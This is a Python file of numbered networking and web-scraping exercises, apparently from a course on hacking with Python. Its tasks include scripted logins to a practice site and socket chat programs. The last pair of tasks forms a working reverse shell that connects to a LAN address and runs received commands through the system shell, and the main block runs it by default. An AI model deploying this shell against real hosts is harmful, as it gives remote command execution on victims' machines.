import fire

def task1():
    import urllib3
    http = urllib3.PoolManager()
    r = http.request("GET", "wp.pl")
    print("the page status is {}\n".format(r.status))
    print("Contents:\n\n{}".format(r.data.decode("utf-8")))

def task2():
    import requests
    r = requests.get("https://hack-yourself-first.com")
    print(f"the page is {r.status_code}")
    print(f"content {r.content}")

def task3():
    import requests
    try:
        payload = {"Email":"gauff@usopen.com", "Password":"coco"}
        r = requests.post("https://hack-yourself-first.com/Account/Login", data = payload)
        if "Log off" in r.text:
            print("Jestes zalogowany")
        # print(f"the page is {r.status_code}")
        # print(f"content {r.content}")    
        else:
            print("sprobuj jeszcze raz")
    except error as err:
        pass
def task4():
    import requests
    session = requests.session()
    burp0_url = "https://hack-yourself-first.com:443/Account/Login"
    burp0_headers = {"Sec-Ch-Ua": "", "Sec-Ch-Ua-Mobile": "?0", "Sec-Ch-Ua-Platform": "\"\"", "Upgrade-Insecure-Requests": "1", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.141 Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7", "Sec-Fetch-Site": "none", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-User": "?1", "Sec-Fetch-Dest": "document", "Accept-Encoding": "gzip, deflate", "Accept-Language": "en-US,en;q=0.9", "Connection": "close"}
    
    burp0_data = {"Email": "gauff@usopen.com", "Password": "coco", "RememberMe": "false"}
    r = session.get(burp0_url, headers=burp0_headers, data = burp0_data)
    if "Log off" in r.text:
        print("Jestes zalogowany")
    # print(f"the page is {r.status_code}")
    # print(f"content {r.content}")    
    else:
        print("sprobuj jeszcze raz")


def task4_correct():
    import requests
 
    session = requests.session()
    
    burp0_url = "https://hack-yourself-first.com:443/Account/Login"
    burp0_cookies = {"ASP.NET_SessionId": "ux1dbpyz2x2iefbwuvt2hxqk", "VisitStart": "9/10/2023 7:41:53 AM", "IsAdmin": "false"}
    burp0_headers = {"Cache-Control": "max-age=0", "Sec-Ch-Ua": "\"Chromium\";v=\"116\", \"Not)A;Brand\";v=\"24\", \"Google Chrome\";v=\"116\"", "Sec-Ch-Ua-Mobile": "?0", "Sec-Ch-Ua-Platform": "\"Windows\"", "Upgrade-Insecure-Requests": "1", "Origin": "https://hack-yourself-first.com", "Content-Type": "application/x-www-form-urlencoded", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7", "Sec-Fetch-Site": "same-origin", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-User": "?1", "Sec-Fetch-Dest": "document", "Referer": "https://hack-yourself-first.com/Account/Login", "Accept-Encoding": "gzip, deflate", "Accept-Language": "en-US,en;q=0.9"}
    burp0_data = {"Email": "gauff@usopen.com", "Password": "coco", "RememberMe": "false"}
    zapytanie = session.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data)
    if "Log off" in zapytanie.text:
            print("Jestes zalogowany")
    else:
            print("Sprobuj jeszcze raz")

def task5_1():
    import requests
    r = requests.post("https://hack-yourself-first.com")
    print(r.text)

def task5_2():
    import requests
    burp0_url = "https://hack-yourself-first.com:443/Account/Login"
    burp0_cookies = {"ASP.NET_SessionId": "5dcksvhv5c2kgaimm2u25gi2", "VisitStart": "9/10/2023 8:42:49 AM"}
    burp0_headers = {"Cache-Control": "max-age=0", "Sec-Ch-Ua": "", "Sec-Ch-Ua-Mobile": "?0", "Sec-Ch-Ua-Platform": "\"\"", "Upgrade-Insecure-Requests": "1", "Origin": "https://hack-yourself-first.com", "Content-Type": "application/x-www-form-urlencoded", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.141 Safari/537.36", "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7", "Sec-Fetch-Site": "same-origin", "Sec-Fetch-Mode": "navigate", "Sec-Fetch-User": "?1", "Sec-Fetch-Dest": "document", "Referer": "https://hack-yourself-first.com/Account/Login", "Accept-Encoding": "gzip, deflate", "Accept-Language": "en-US,en;q=0.9"}
    burp0_data = {"Email": "gauff@usopen.com", "Password": "coco", "RememberMe": "true", "RememberMe": "false"}
    r = requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data)
    if "Log off" in r.text:
            print("Jestes zalogowany")
    else:
            print("Sprobuj jeszcze raz")
     
def task6():
    from bs4 import BeautifulSoup
    import requests
    session = requests.session()
    def g(s, *args, **vargs):
         return session.get(s, verify=False, **vargs)
    #r = session.get("https://mirror.hackthissite.org/hackthiszine/", verify=False)
    r = g("https://mirror.hackthissite.org/hackthiszine/")
    soup = BeautifulSoup(r.text, "html.parser")
    
    for search in soup.findAll("a"):
        try:
            link = search.get("href")
            if link.endswith(".pdf"):
                print(f"PDF File: {link}")
                params = link.split("/")
                pdf_name = params[-1]
                r = g(f"https://mirror.hackthissite.org/hackthiszine/{pdf_name}", stream=True)
                #r = requests.get(f"https://mirror.hackthissite.org/hackthiszine/{pdf_name}", stream=True, verify=False)
                with open(f"{pdf_name}", "wb") as f:
                    f.write(r.content)
                    f.close()
            else:
                continue

        except:
            print("there was an error. Try again bucko")

def task7():
    from requests_html import HTMLSession
    session = HTMLSession()
    req = session.get("https://www.google.com/search?q=cats")
    links = req.html.links
    for link in links:
        if link.startswith("https"):
            print(link)

def task8():
    from bs4 import BeautifulSoup
    import requests
    session = requests.session()
    r = session.get("https://developer.mozilla.org/en-US/")
    soup = BeautifulSoup(r.text, "html.parser")
    for l in [script.get("src") for script in soup.findAll("script") if script.get("src") is not None]:
        print(l)

def task9():
    from bs4 import BeautifulSoup
    import requests
    session = requests.session()
    r = session.get("https://mirror.hackthissite.org/hackthiszine", verify=False)
    soup = BeautifulSoup(r.text, "html.parser")
    for pdf in [a for a in [a.get("href") for a in soup.findAll("a")] if a.endswith("pdf")]:
        print(pdf)
        r = requests.get("https://mirror.hackthissite.org/hackthiszine/" + pdf, stream=True, verify=False)
        filename = pdf.split("/")[-1]
        print(filename + "============================")
        with open(pdf.split("/")[-1], "wb") as f:
            f.write(r.content)
#download all pdf

def task10():
    import socket
    s = socket.socket()
    address = "192.168.11.118"
    s.connect((address, 4444))
    s.close()

def task11():
    import socket
    mysocket = socket.socket()
    mysocket.bind(("0.0.0.0", 8080))
    mysocket.listen(1)
    #nc -v 192.168.11.118 8080
    conn, addr = mysocket.accept()
    mysocket.close()

def task12():
    import socket
    s = socket.socket()
    s.connect(("192.168.11.118", 8080))
    s.send("Hi there friend".encode())
    s.close()

def task13():
    import socket
    mysocket = socket.socket()
    mysocket.bind(("0.0.0.0", 8080))
    mysocket.listen(1)
    #nc -v 192.168.11.118 8080
    conn, addr = mysocket.accept()
    data = conn.recv(2048).decode()
    print(data)
    mysocket.close()

def task14():
    import threading
    import time
    import os
    try:
        os.delete("herp.txt")
    except:
        pass
    def o():
        with open("herp.txt", "w") as f:
            f.write("herp"*30)
    t1 = threading.Thread(target=o)
    t1.start()
    time.sleep(2)
    with open("herp.txt", "r") as f:
        print(f.read())

def task15():
    import threading
    import time
    client = task12
    def server():
        x = 0
        while x < 3:
            task13()
            x += 1
    t = threading.Thread(target=server)
    t.start()

    while True:
        time.sleep(1)
        try:
            client()
        except ConnectionRefusedError as err:
            print("ended as expected")
            break

def task16():
    import socket
    s = socket.socket()
    s.bind(("0.0.0.0", 8080))
    s.listen(1)
    c, a = s.accept()
    d = c.recv(2048).decode()
    buffer = 2048
    #data = b""
    while True:
        packet = c.recv(buffer)
        print(packet)
        parsed = packet.decode()
        d += parsed
        print(parsed)
        if len(packet) < buffer:
            print("-----Server Message (really)-----\nAll the data has been received")
            s.close()
            break

def task17():
    import socket
    s = socket.socket()
    s.connect(("192.168.11.118", 8080))
    s.send(("Hi there friend"*3000).encode())
    s.close()

def task18():
    import threading
    import time
    client = task17
    server = threading.Thread(target=task16)
    server.start()
    time.sleep(1)
    try:
        client()
    except ConnectionRefusedError as err:
        print("ended as expected")

def task19():
    import socket 
    s = socket.socket()
    s.bind(("0.0.0.0", 8081))
    s.listen(1)
    c, a = s.accept()
    print(c.recv(2048).decode())
    c.send("exit from server".encode())
    c.close()


def task20():
    import socket
    s = socket.socket()
    s.connect(("192.168.11.118", 8081))
    s.send("exit from client".encode())
    print(s.recv(2048).decode())
    s.close()

def task21():
    import socket
    s = socket.socket()
    s.bind(("0.0.0.0", 8080))
    s.listen(1)
    print("starting to wait for connections")
    c, a = s.accept()
    while True:
        try:
            clientData = c.recv(2048).decode()
            print("message from user:", clientData)
            msg = input("server says: ")
            c.send(msg.encode())
            if msg == "exit" or clientData == "exit":
                print("closing connection")
                s.close()
                break
        except Exception as err:
            if "ConnectionAbortedError" in err:
                print("server closed the connection")
                s.close()

def task22():
    import socket
    s = socket.socket()
    print("connecting")
    s.connect(("192.168.11.118", 8080))
    print("connected")
    while True:
        try:

            client = input("client says: ")
            s.send(client.encode())
            serverData = s.recv(2048).decode()
            print("server data received")

            if client == "exit" or serverData == "exit":
                print("Closing connection")
                s.close()
                break
            else:
                print("Message from server", serverData)
        except Exception as err:
            if "ConnectionAbortedError" in err:
                print("server closed for connection")
                s.close()

    s.send("exit from client".encode())
    print(s.recv(2048).decode())
    s.close()

def task23():
    import socket
    s = socket.socket()
    s.bind(("0.0.0.0", 8080))
    s.listen(1)
    c, a = s.accept()
    print("server ON")
    while True:
        msg = c.recv(2048).decode()
        print(msg)
        i = input("type something other than exit:")
        if i == "exit":
            c.send(f"exit".encode())
        else:
            c.send(f"hello {a} {i}".encode())
        if msg == "exit":
            break
    s.close()

def task24():
    import socket
    s = socket.socket()
    s.connect(("192.168.11.118", 8080))
    while True:
        i = input("what do you want to send to the server? -->")
        s.send(i.encode())
        msg = s.recv(2048).decode()
        print(msg)
        if msg == "exit":
            break
    s.close()

def task25():
    import socket
    s = socket.socket()
    s.bind(("0.0.0.0", 8080))
    s.listen(1)
    c, a = s.accept()
    print("server ON")
    while True:
        command = input("komenda do wykonania: ")
        c.send(command.encode())
        if command == "exitNow":
            break
        result = c.recv(2048).decode()
        print(result)

def task26():
    import socket
    import subprocess
    s = socket.socket()
    s.connect(("192.168.11.118", 8080))
    while True:
        command = s.recv(2048).decode()
        print(command)
        if command == "exitNow":
            break
        result = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, encoding="utf-8").stdout.read()
        s.send(str(result).encode())
        if command == "exitNow":
            break
    s.close()


if __name__ == "__main__":
    import sys
    if len(sys.argv) > 1:
        fire.Fire()
    else:
        eval([line.split(" ")[1].split("(")[0] for line in open(__file__, "r") if "def" == line[0:3]].pop() + "()")
